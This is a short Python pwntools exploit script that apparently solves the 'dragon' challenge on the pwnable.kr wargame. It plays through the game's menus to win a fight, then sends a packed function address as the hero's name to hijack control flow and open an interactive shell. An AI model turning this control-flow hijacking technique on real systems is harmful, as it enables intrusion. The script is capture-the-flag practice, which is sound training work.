from pwn import *

conn = remote("pwnable.kr",  9004)
win_addr = p32(0x08048dbf)

print(conn.recvuntil(b"[ 2 ] Knight"))
conn.send("1\n")
print(conn.recvuntil(b"Invincible."))
conn.send("1\n")
print(conn.recvuntil(b"Invincible."))
conn.send("1\n")

print(conn.recvuntil(b"[ 2 ] Knight"))
conn.send("1\n")

for i in range(0, 4):
    print(conn.recvuntil(b"You Become Temporarily Invincible."))
    conn.send("3\n")
    print(conn.recvuntil(b"You Become Temporarily Invincible."))
    conn.send("3\n")
    print(conn.recvuntil(b"Invincible."))
    conn.send("2\n")

print(conn.recvuntil(b"The World Will Remember You As:"))

conn.send(win_addr)
conn.recvuntil(b"And The Dragon You Have Defeated Was Called:")
conn.interactive()
